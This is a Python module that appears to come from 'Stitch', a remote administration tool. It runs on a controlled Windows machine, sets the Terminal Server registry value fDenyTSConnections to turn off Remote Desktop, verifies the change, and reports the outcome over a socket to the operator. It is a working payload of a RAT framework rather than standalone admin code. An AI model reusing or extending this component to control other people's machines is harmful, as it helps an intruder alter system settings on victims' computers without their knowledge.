# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def disable_rdp():
    return run_command('REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')

def check_rdp():
    rdp_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Terminal Server')
    val=_winreg.QueryValueEx(rdp_key, "fDenyTSConnections")
    if val[0] == 1:
        return False
    else:
        return True

if check_rdp():
    disable_rdp()
    if not check_rdp():
        send(client_socket, "[+] RDP is now Disabled\n")
    else:
        send(client_socket, "[!] Failed to disable RDP, RDP is still Enabled\n")
else:
    send(client_socket, "[*] RDP is already Disabled\n")
